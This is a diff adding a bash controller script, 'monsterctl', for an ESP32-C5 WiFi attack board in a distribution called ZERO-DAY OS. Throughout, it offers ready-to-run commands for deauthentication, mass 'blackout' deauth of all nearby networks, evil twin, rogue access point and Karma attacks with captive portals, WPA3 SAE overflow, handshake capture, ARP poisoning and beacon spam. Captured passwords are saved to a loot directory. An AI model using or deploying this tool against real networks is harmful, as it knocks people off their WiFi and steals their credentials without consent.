@@ -1,0 +1,734 @@
+#!/bin/bash
+# /usr/local/bin/monsterctl
+# M5MonsterC5 ESP32C5 board controller for ZERO-DAY OS
+# Communicates with the MonsterC5 over UART (115200 baud) or USB serial
+#
+# The M5MonsterC5 is an ESP32C5-based WiFi offensive board that connects
+# to the Cardputer Zero via USB or serial. It runs JanOS (projectZero) firmware
+# and provides: deauth, evil twin, WPA3 SAE overflow, wardriving, sniffer,
+# karma, ARP poisoning, blackout, beacon spam, and more.
+#
+# Usage: monsterctl <command> [args...]
+#
+# Based on: https://github.com/C5Lab/M5MonsterC5-CardputerADV
+# Firmware: https://github.com/C5Lab/projectZero
+
+MONSTER_PORT="${MONSTER_PORT:-}"
+MONSTER_BAUD=115200
+MONSTER_TIMEOUT=10
+LOOT_DIR="/opt/cardputer/loot/monster"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+
+# Try common serial ports for the MonsterC5 board
+detect_port() {
+    # If manually specified, use it
+    if [ -n "$MONSTER_PORT" ]; then
+        if [ -e "$MONSTER_PORT" ]; then
+            echo "$MONSTER_PORT"
+            return 0
+        else
+            echo "[!] Specified port $MONSTER_PORT not found" >&2
+            return 1
+        fi
+    fi
+
+    # Auto-detect: check USB serial devices, then UART
+    for port in /dev/ttyUSB0 /dev/ttyUSB1 /dev/ttyACM0 /dev/ttyACM1 /dev/ttyAMA0; do
+        if [ -e "$port" ]; then
+            # Try to ping the board
+            if ping_board "$port" 2>/dev/null; then
+                echo "$port"
+                return 0
+            fi
+        fi
+    done
+
+    # Fallback: return first available serial port
+    for port in /dev/ttyUSB0 /dev/ttyUSB1 /dev/ttyACM0 /dev/ttyACM1 /dev/ttyAMA0; do
+        if [ -e "$port" ]; then
+            echo "$port"
+            return 0
+        fi
+    done
+
+    echo "[!] No MonsterC5 board found on any serial port" >&2
+    echo "[!] Connect the M5MonsterC5 board via USB or check UART wiring" >&2
+    echo "[!] Set MONSTER_PORT environment variable to override" >&2
+    return 1
+}
+
+# Send a command to the board and wait for response
+send_cmd() {
+    local port="$1"
+    local cmd="$2"
+    local timeout="${3:-$MONSTER_TIMEOUT}"
+
+    if [ ! -e "$port" ]; then
+        echo "[!] Serial port $port not found" >&2
+        return 1
+    fi
+
+    # Send command with CRLF termination
+    echo -e "${cmd}\r\n" > "$port" 2>/dev/null
+}
+
+# Read response lines from the board
+read_response() {
+    local port="$1"
+    local duration="${2:-5}"
+    local output=""
+
+    # Read from serial port for specified duration
+    timeout "$duration" cat "$port" 2>/dev/null || true
+}
+
+# Ping the board to check connectivity
+ping_board() {
+    local port="$1"
+    local timeout_ms="${2:-2000}"
+
+    if [ ! -e "$port" ]; then
+        return 1
+    fi
+
+    # Configure the port
+    stty -F "$port" "$MONSTER_BAUD" raw -echo -echoe -echok 2>/dev/null || return 1
+
+    # Send ping
+    send_cmd "$port" "ping" >/dev/null 2>&1
+
+    # Wait for pong
+    local start=$(date +%s%N)
+    while true; do
+        local response=$(timeout 0.1 cat "$port" 2>/dev/null || true)
+        if echo "$response" | grep -q "pong"; then
+            return 0
+        fi
+        local now=$(date +%s%N)
+        local elapsed=$(( (now - start) / 1000000 ))
+        if [ "$elapsed" -gt "$timeout_ms" ]; then
+            return 1
+        fi
+    done
+}
+
+# Parse scan results from the board
+parse_scan() {
+    local raw="$1"
+    echo "$raw" | grep '^"' | while IFS= read -r line; do
+        # Format: "id","SSID","","BSSID","channel","security","rssi","band","vendor"
+        local id=$(echo "$line" | cut -d',' -f1 | tr -d '"')
+        local ssid=$(echo "$line" | cut -d',' -f2 | tr -d '"')
+        local bssid=$(echo "$line" | cut -d',' -f4 | tr -d '"')
+        local channel=$(echo "$line" | cut -d',' -f5 | tr -d '"')
+        local security=$(echo "$line" | cut -d',' -f6 | tr -d '"')
+        local rssi=$(echo "$line" | cut -d',' -f7 | tr -d '"')
+        local band=$(echo "$line" | cut -d',' -f8 | tr -d '"')
+        printf "%-3s %-32s %-18s %3s %-24s %4s %4s\n" \
+            "$id" "$ssid" "$bssid" "$channel" "$security" "$rssi" "$band"
+    done
+}
+
+echo "[*] ZERO-DAY OS — M5MonsterC5 Controller"
+echo ""
+
+COMMAND="${1:-help}"
+shift 2>/dev/null || true
+
+case "$COMMAND" in
+    ping|detect)
+        echo "[*] Detecting MonsterC5 board..."
+        PORT=$(detect_port)
+        if [ -n "$PORT" ]; then
+            echo "[+] MonsterC5 board found on $PORT"
+            if ping_board "$PORT"; then
+                echo "[+] Board responded to ping — ready!"
+            else
+                echo "[!] Board detected on $PORT but not responding to ping"
+                echo "[!] Check that JanOS firmware is flashed: monsterctl flash"
+            fi
+        fi
+        ;;
+
+    scan)
+        echo "[*] Scanning WiFi networks via MonsterC5..."
+        PORT=$(detect_port) || exit 1
+
+        # Send scan command
+        send_cmd "$PORT" "scan_networks"
+        echo "[*] Scanning... (waiting for results)"
+        sleep 2
+
+        # Poll for results
+        for i in $(seq 1 15); do
+            send_cmd "$PORT" "show_scan_results"
+            sleep 1
+        done
+
+        echo ""
+        echo "  ID  SSID                             BSSID              CH  SECURITY                  RSSI BAND"
+        echo "  --- -------------------------------- ------------------ --- ------------------------ ---- -----"
+        # Read and parse the full response
+        timeout 2 cat "$PORT" 2>/dev/null | parse_scan
+        echo ""
+        echo "[*] To attack a network, note its ID and run:"
+        echo "    monsterctl select <id1> [id2] ..."
+        echo "    monsterctl deauth|evil_twin|sae_overflow|handshake"
+        ;;
+
+    select)
+        # Select networks for attack
+        if [ -z "$1" ]; then
+            echo "Usage: monsterctl select <id1> [id2] [id3] ..."
+            echo ""
+            echo "  Select one or more network IDs from a scan to target."
+            echo "  Use 'monsterctl scan' first to get network IDs."
+            exit 0
+        fi
+
+        PORT=$(detect_port) || exit 1
+        IDS="$*"
+        echo "[*] Selecting networks: $IDS"
+        send_cmd "$PORT" "select_networks $IDS"
+        sleep 1
+        echo "[+] Networks selected. Choose an attack:"
+        echo "    monsterctl deauth          — Deauthenticate clients"
+        echo "    monsterctl evil_twin       — Evil Twin + captive portal"
+        echo "    monsterctl sae_overflow    — WPA3 SAE overflow"
+        echo "    monsterctl handshake       — Capture 4-way handshake"
+        echo "    monsterctl sniffer         — WiFi packet sniffer"
+        ;;
+
+    unselect)
+        PORT=$(detect_port) || exit 1
+        send_cmd "$PORT" "unselect_networks"
+        echo "[+] Network selection cleared"
+        ;;
+
+    deauth)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting deauthentication attack..."
+        echo "[*] Press Ctrl+C to stop"
+        send_cmd "$PORT" "start_deauth"
+        # Stream output until Ctrl+C
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Deauth stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null
+        ;;
+
+    evil_twin)
+        HTML="${1:-1}"
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting Evil Twin attack..."
+        echo "[*] Using portal HTML #$HTML"
+        send_cmd "$PORT" "select_html $HTML"
+        sleep 1
+        send_cmd "$PORT" "start_evil_twin"
+        echo "[+] Evil Twin running. Captured passwords:"
+        # Create loot dir
+        mkdir -p "$LOOT_DIR"
+        # Stream and capture passwords
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Evil Twin stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null | while IFS= read -r line; do
+            echo "$line"
+            echo "$line" >> "$LOOT_DIR/evil_twin_creds_${TIMESTAMP}.log"
+        done
+        ;;
+
+    sae_overflow)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting WPA3 SAE overflow attack..."
+        echo "[*] Press Ctrl+C to stop"
+        send_cmd "$PORT" "start_sae_overflow"
+        trap "send_cmd '$PORT' 'stop'; echo '[*] SAE overflow stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null
+        ;;
+
+    handshake)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting handshake capture..."
+        echo "[*] Press Ctrl+C to stop"
+        send_cmd "$PORT" "start_handshake"
+        mkdir -p "$LOOT_DIR"
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Handshake capture stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null | while IFS= read -r line; do
+            echo "$line"
+            echo "$line" >> "$LOOT_DIR/handshake_${TIMESTAMP}.log"
+            if echo "$line" | grep -q "Complete 4-way handshake saved"; then
+                echo "[+] Handshake captured!"
+            fi
+        done
+        ;;
+
+    sniffer)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting WiFi sniffer..."
+        echo "[*] Press Ctrl+C to stop"
+        if [ -n "$1" ]; then
+            send_cmd "$PORT" "start_sniffer"
+        else
+            send_cmd "$PORT" "start_sniffer_noscan"
+        fi
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Sniffer stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null
+        ;;
+
+    blackout)
+        PORT=$(detect_port) || exit 1
+        echo "[!] Starting BLACKOUT — mass deauth of ALL networks"
+        echo "[!] This is extremely aggressive. Press Ctrl+C to stop."
+        send_cmd "$PORT" "start_blackout"
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Blackout stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null
+        ;;
+
+    sniffer_dog)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting SnifferDog (auto deauth detector/kicker)..."
+        echo "[*] Press Ctrl+C to stop"
+        send_cmd "$PORT" "start_sniffer_dog"
+        trap "send_cmd '$PORT' 'stop'; echo '[*] SnifferDog stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null
+        ;;
+
+    karma)
+        PROBE_N="${1:-}"
+        HTML_N="${2:-1}"
+        if [ -z "$PROBE_N" ]; then
+            echo "Usage: monsterctl karma <probe_number> [html_number]"
+            echo ""
+            echo "  Start a Karma attack responding to a probed SSID."
+            echo "  Use 'monsterctl probes' to list available probe SSIDs first."
+            echo "  html_number selects which captive portal to use (default: 1)."
+            exit 0
+        fi
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting Karma attack (probe #$PROBE_N, portal #$HTML_N)..."
+        send_cmd "$PORT" "select_html $HTML_N"
+        sleep 1
+        send_cmd "$PORT" "start_karma $PROBE_N"
+        mkdir -p "$LOOT_DIR"
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Karma stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null | while IFS= read -r line; do
+            echo "$line"
+            echo "$line" >> "$LOOT_DIR/karma_creds_${TIMESTAMP}.log"
+        done
+        ;;
+
+    probes)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Listing probe requests..."
+        send_cmd "$PORT" "list_probes"
+        sleep 2
+        timeout 3 cat "$PORT" 2>/dev/null | grep -E "^[0-9]+ "
+        ;;
+
+    deauth_detect)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting deauth detector..."
+        echo "[*] Press Ctrl+C to stop"
+        send_cmd "$PORT" "deauth_detector"
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Detector stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null
+        ;;
+
+    beacon_spam)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting beacon spam (SSIDs from SD card)..."
+        echo "[*] Press Ctrl+C to stop"
+        send_cmd "$PORT" "start_beacon_spam_ssids"
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Beacon spam stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null
+        ;;
+
+    wardrive)
+        MODE="${1:-promisc}"
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting wardrive ($MODE mode)..."
+        mkdir -p "$LOOT_DIR"
+        if [ "$MODE" = "trace" ]; then
+            send_cmd "$PORT" "start_wardrive_promisc_trace"
+        else
+            send_cmd "$PORT" "start_wardrive_promisc"
+        fi
+        echo "[*] Wardriving... Press Ctrl+C to stop and save"
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Wardrive stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null | while IFS= read -r line; do
+            echo "$line"
+            echo "$line" >> "$LOOT_DIR/wardrive_${TIMESTAMP}.csv"
+        done
+        ;;
+
+    nmap)
+        TARGET="${1:-}"
+        SCAN_TYPE="${2:-quick}"
+        PORT=$(detect_port) || exit 1
+        if [ -n "$TARGET" ]; then
+            echo "[*] Starting nmap scan ($SCAN_TYPE) of $TARGET..."
+            send_cmd "$PORT" "start_nmap $TARGET $SCAN_TYPE"
+        else
+            echo "[*] Starting nmap scan ($SCAN_TYPE) of all hosts..."
+            send_cmd "$PORT" "start_nmap $SCAN_TYPE"
+        fi
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Nmap stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null
+        ;;
+
+    arp_poison|arp_ban)
+        MAC="${1:-}"
+        if [ -z "$MAC" ]; then
+            echo "Usage: monsterctl arp_poison <MAC_address>"
+            echo ""
+            echo "  Start ARP poisoning against a specific MAC."
+            echo "  Use 'monsterctl hosts' to discover MAC addresses."
+            exit 0
+        fi
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting ARP poisoning against $MAC..."
+        echo "[*] Press Ctrl+C to stop"
+        send_cmd "$PORT" "arp_ban $MAC"
+        trap "send_cmd '$PORT' 'stop'; echo '[*] ARP poisoning stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null
+        ;;
+
+    rogue_ap)
+        SSID="${1:-FreeWiFi}"
+        PASS="${2:-}"
+        HTML="${3:-1}"
+        PORT=$(detect_port) || exit 1
+        echo "[*] Starting Rogue AP: $SSID"
+        send_cmd "$PORT" "select_html $HTML"
+        sleep 1
+        if [ -n "$PASS" ]; then
+            send_cmd "$PORT" "start_rogueap $SSID $PASS"
+        else
+            send_cmd "$PORT" "start_rogueap $SSID"
+        fi
+        mkdir -p "$LOOT_DIR"
+        trap "send_cmd '$PORT' 'stop'; echo '[*] Rogue AP stopped'; exit 0" INT TERM
+        cat "$PORT" 2>/dev/null | while IFS= read -r line; do
+            echo "$line"
+            echo "$line" >> "$LOOT_DIR/rogue_ap_creds_${TIMESTAMP}.log"
+        done
+        ;;
+
+    passwords|show_pass)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Querying captured passwords..."
+        send_cmd "$PORT" "show_pass evil"
+        sleep 2
+        timeout 3 cat "$PORT" 2>/dev/null
+        ;;
+
+    hosts)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Listing discovered hosts..."
+        send_cmd "$PORT" "list_hosts"
+        sleep 2
+        timeout 5 cat "$PORT" 2>/dev/null
+        ;;
+
+    wifi_connect)
+        SSID="${1:-}"
+        PASS="${2:-}"
+        if [ -z "$SSID" ]; then
+            echo "Usage: monsterctl wifi_connect <SSID> [PASSWORD]"
+            exit 0
+        fi
+        PORT=$(detect_port) || exit 1
+        echo "[*] Connecting MonsterC5 to WiFi: $SSID"
+        if [ -n "$PASS" ]; then
+            send_cmd "$PORT" "wifi_connect \"$SSID\" \"$PASS\""
+        else
+            send_cmd "$PORT" "wifi_connect \"$SSID\""
+        fi
+        sleep 5
+        timeout 3 cat "$PORT" 2>/dev/null
+        ;;
+
+    wifi_disconnect)
+        PORT=$(detect_port) || exit 1
+        send_cmd "$PORT" "wifi_disconnect"
+        echo "[+] MonsterC5 disconnected from WiFi"
+        ;;
+
+    gps)
+        MODULE="${1:-cap}"
+        PORT=$(detect_port) || exit 1
+        echo "[*] Setting GPS module: $MODULE"
+        case "$MODULE" in
+            atgm) send_cmd "$PORT" "gps_set atgm" ;;
+            m5)   send_cmd "$PORT" "gps_set m5" ;;
+            ext|external) send_cmd "$PORT" "gps_set external" ;;
+            cap|onboard) send_cmd "$PORT" "gps_set cap" ;;
+            *) echo "[!] Unknown GPS module. Use: atgm, m5, external, cap" ;;
+        esac
+        ;;
+
+    flash)
+        echo "[*] M5MonsterC5 Firmware Flasher"
+        echo ""
+        echo "This will flash the latest JanOS/projectZero firmware to the MonsterC5 board."
+        echo ""
+        echo "Prerequisites:"
+        echo "  1. Install esptool: pip3 install esptool"
+        echo "  2. Connect MonsterC5 board via USB"
+        echo "  3. Hold BOOT button, press RESET, release BOOT (enter download mode)"
+        echo ""
+        echo "Flashing options:"
+        echo "  monsterctl flash web       — Open web flasher in browser"
+        echo "  monsterctl flash local     — Flash locally with esptool"
+        echo "  monsterctl flash cardputer — Flash CardputerADV app (ESP32S3)"
+        echo ""
+
+        case "${1:-}" in
+            web)
+                echo "[*] Opening JanOS web flasher..."
+                echo "    https://c5lab.github.io/projectZero/janos_flash.html"
+                echo ""
+                echo "[*] For the CardputerADV app:"
+                echo "    https://c5lab.github.io/M5MonsterC5-CardputerADV/janos_flash.html"
+                if command -v xdg-open &>/dev/null; then
+                    xdg-open "https://c5lab.github.io/projectZero/janos_flash.html" 2>/dev/null
+                fi
+                ;;
+            local)
+                if ! command -v esptool.py &>/dev/null && ! command -v esptool &>/dev/null; then
+                    echo "[!] esptool not found. Install with: pip3 install esptool"
+                    echo "[!] Then run: monsterctl flash local"
+                    exit 1
+                fi
+                ESPTOOL=$(command -v esptool.py 2>/dev/null || command -v esptool 2>/dev/null)
+                FLASH_PORT=$(detect_port) || exit 1
+                FIRMWARE_DIR="/opt/cardputer/monsterc5/firmware"
+
+                if [ ! -d "$FIRMWARE_DIR" ]; then
+                    echo "[!] No firmware files found in $FIRMWARE_DIR"
+                    echo "[*] Download the latest release from:"
+                    echo "    https://github.com/C5Lab/projectZero/releases"
+                    echo "    https://github.com/C5Lab/M5MonsterC5-CardputerADV/releases"
+                    echo ""
+                    echo "[*] Extract to $FIRMWARE_DIR/ and re-run this command."
+                    exit 1
+                fi
+
+                echo "[*] Flashing MonsterC5 board on $FLASH_PORT..."
+                echo "[*] Make sure the board is in download mode (hold BOOT + RESET)"
+                "$ESPTOOL" --chip esp32c5 --port "$FLASH_PORT" --baud 460800 \
+                    write_flash -z 0x0 "$FIRMWARE_DIR/janos_esp32c5.bin"
+                echo ""
+                echo "[+] Flash complete! Press RESET to start."
+                ;;
+            cardputer)
+                if ! command -v esptool.py &>/dev/null && ! command -v esptool &>/dev/null; then
+                    echo "[!] esptool not found. Install with: pip3 install esptool"
+                    exit 1
+                fi
+                ESPTOOL=$(command -v esptool.py 2>/dev/null || command -v esptool 2>/dev/null)
+                FLASH_PORT=$(detect_port) || exit 1
+                FIRMWARE_DIR="/opt/cardputer/monsterc5/cardputeradv"
+
+                if [ ! -d "$FIRMWARE_DIR" ]; then
+                    echo "[!] No CardputerADV firmware found in $FIRMWARE_DIR"
+                    echo "[*] Download from: https://github.com/C5Lab/M5MonsterC5-CardputerADV/releases"
+                    echo "[*] Extract to $FIRMWARE_DIR/ and re-run."
+                    exit 1
+                fi
+
+                echo "[*] Flashing CardputerADV app on $FLASH_PORT..."
+                echo "[*] Hold BtnGo while connecting USB, then release."
+                "$ESPTOOL" --chip esp32s3 --port "$FLASH_PORT" --baud 460800 \
+                    write_flash -z 0x0 "$FIRMWARE_DIR/cardputeradv.bin"
+                echo ""
+                echo "[+] Flash complete! Press RESET to start."
+                ;;
+            *)
+                echo "[!] Specify flash method: web, local, or cardputer"
+                ;;
+        esac
+        ;;
+
+    list_sd|sd)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Listing MonsterC5 SD card contents..."
+        send_cmd "$PORT" "list_sd"
+        sleep 2
+        timeout 3 cat "$PORT" 2>/dev/null
+        ;;
+
+    list_html)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Listing HTML portal files on SD card..."
+        send_cmd "$PORT" "list_sd"
+        sleep 2
+        timeout 3 cat "$PORT" 2>/dev/null | grep -i html
+        ;;
+
+    channel_time)
+        ACTION="${1:-read}"
+        WHICH="${2:-min}"
+        VALUE="${3:-}"
+        PORT=$(detect_port) || exit 1
+
+        case "$ACTION" in
+            read)
+                echo "[*] Reading channel dwell time ($WHICH)..."
+                send_cmd "$PORT" "channel_time read $WHICH"
+                sleep 1
+                timeout 2 cat "$PORT" 2>/dev/null
+                ;;
+            set)
+                if [ -z "$VALUE" ]; then
+                    echo "Usage: monsterctl channel_time set <min|max> <100-1500>"
+                    exit 0
+                fi
+                echo "[*] Setting channel dwell time ($WHICH = $VALUE ms)..."
+                send_cmd "$PORT" "channel_time set $WHICH $VALUE"
+                ;;
+        esac
+        ;;
+
+    stop)
+        PORT=$(detect_port) || exit 1
+        echo "[*] Stopping current attack..."
+        send_cmd "$PORT" "stop"
+        echo "[+] Attack stopped"
+        ;;
+
+    status)
+        echo "[*] M5MonsterC5 Status"
+        echo ""
+        PORT=$(detect_port) 2>/dev/null
+        if [ -n "$PORT" ]; then
+            echo "  Board port:  $PORT"
+            if ping_board "$PORT" 2>/dev/null; then
+                echo "  Board:       ONLINE (responded to ping)"
+            else
+                echo "  Board:       DETECTED (not responding to ping)"
+                echo "               Try: monsterctl flash"
+            fi
+        else
+            echo "  Board:       NOT FOUND"
+            echo ""
+            echo "[*] Troubleshooting:"
+            echo "  - Connect MonsterC5 board via USB"
+            echo "  - Check: ls /dev/ttyUSB* /dev/ttyACM*"
+            echo "  - Set: export MONSTER_PORT=/dev/ttyUSB0"
+        fi
+        echo ""
+        echo "[*] Saved captures: $LOOT_DIR/"
+        if [ -d "$LOOT_DIR" ]; then
+            ls -la "$LOOT_DIR/" 2>/dev/null | tail -5
+        else
+            echo "  (no captures yet)"
+        fi
+        ;;
+
+    janos|interactive|tui)
+        # Launch the JanOS-app Python TUI — the proper interactive controller
+        JANOS_SCRIPT="/opt/cardputer/janos-app/JanOS_app.py"
+
+        if [ ! -f "$JANOS_SCRIPT" ]; then
+            echo "[!] JanOS-app not installed"
+            echo "[*] Install with: install-janos install"
+            echo ""
+            echo "[*] JanOS-app provides a full interactive TUI for the MonsterC5:"
+            echo "    - Scan, select, and attack WiFi networks"
+            echo "    - Real-time sniffer, evil twin, karma, portal monitoring"
+            echo "    - Wardrive with GPS"
+            echo "    - SD card data browser"
+            echo ""
+            echo "    https://github.com/D3h420/JanOS-app"
+            exit 1
+        fi
+
+        if ! python3 -c "import serial" 2>/dev/null; then
+            echo "[!] pyserial not installed. Run: install-janos install"
+            exit 1
+        fi
+
+        PORT="${2:-}"
+        if [ -n "$PORT" ]; then
+            echo "[*] Launching JanOS-app on ${PORT}..."
+            python3 "$JANOS_SCRIPT" "$PORT"
+        else
+            echo "[*] Launching JanOS-app (interactive device selection)..."
+            python3 "$JANOS_SCRIPT"
+        fi
+        ;;
+
+    help|--help|-h)
+        echo "Usage: monsterctl <command> [args...]"
+        echo ""
+        echo "M5MonsterC5 ESP32C5 board controller for ZERO-DAY OS"
+        echo "Communicates over UART/USB serial at 115200 baud"
+        echo ""
+        echo "Detection:"
+        echo "  status                 Show board status and connectivity"
+        echo "  ping                   Ping the board (detect/check)"
+        echo ""
+        echo "Scanning:"
+        echo "  scan                   Scan WiFi networks via MonsterC5"
+        echo "  select <id1> [id2...] Select networks for attack"
+        echo "  unselect              Clear network selection"
+        echo "  probes                List probe requests (for Karma)"
+        echo "  hosts                 List discovered hosts (for nmap/ARP)"
+        echo "  list_sd               List files on MonsterC5 SD card"
+        echo "  list_html             List HTML portal files on SD card"
+        echo ""
+        echo "Attacks:"
+        echo "  deauth                  Deauthenticate selected networks"
+        echo "  evil_twin [html_N]      Evil Twin + captive portal (default: html 1)"
+        echo "  sae_overflow            WPA3 SAE overflow attack"
+        echo "  handshake               Capture 4-way handshake"
+        echo "  sniffer                 WiFi packet sniffer"
+        echo "  sniffer_noscan         Resume sniffer without re-scan"
+        echo "  blackout                Mass deauth ALL networks"
+        echo "  sniffer_dog             Auto deauth detector/kicker"
+        echo "  karma <probe_N> [html]  Karma attack (responds to probes)"
+        echo "  beacon_spam             Beacon flood from SD card SSIDs"
+        echo "  rogue_ap <ssid> [pass] [html]  Create rogue AP + portal"
+        echo ""
+        echo "Network:"
+        echo "  wifi_connect <ssid> [pass]  Connect MonsterC5 to WiFi"
+        echo "  wifi_disconnect             Disconnect from WiFi"
+        echo "  nmap [target] [quick|medium|heavy]  Port scan via MonsterC5"
+        echo "  arp_poison <MAC>            ARP poisoning attack"
+        echo ""
+        echo "Recon:"
+        echo "  wardrive [promisc|trace]    GPS-tagged WiFi scan"
+        echo "  deauth_detect               Monitor for deauth frames"
+        echo ""
+        echo "Config:"
+        echo "  gps <atgm|m5|external|cap>  Set GPS module type"
+        echo "  channel_time read <min|max>  Read channel dwell time"
+        echo "  channel_time set <min|max> <100-1500>  Set dwell time"
+        echo "  passwords                   Show captured passwords"
+        echo ""
+        echo "Firmware:"
+        echo "  flash web                  Open web flasher in browser"
+        echo "  flash local                Flash JanOS firmware via esptool"
+        echo "  flash cardputer             Flash CardputerADV app"
+        echo ""
+        echo "Interactive:"
+        echo "  janos                     Launch JanOS-app full interactive TUI"
+        echo "                           (install with: install-janos install)"
+        echo ""
+        echo "Control:"
+        echo "  stop                       Stop current attack"
+        echo ""
+        echo "Environment:"
+        echo "  MONSTER_PORT=/dev/ttyUSB0  Override serial port"
+        echo "  MONSTER_TIMEOUT=10         Response timeout (seconds)"
+        echo ""
+        echo "Capture files saved to: $LOOT_DIR/"
+        echo ""
+        echo "M5MonsterC5 board: https://github.com/C5Lab/M5MonsterC5-CardputerADV"
+        echo "JanOS firmware:    https://github.com/C5Lab/projectZero"
+        ;;
+
+    *)
+        echo "[!] Unknown command: $COMMAND"
+        echo "[*] Run 'monsterctl help' for usage."
+        exit 1
+        ;;
+esac
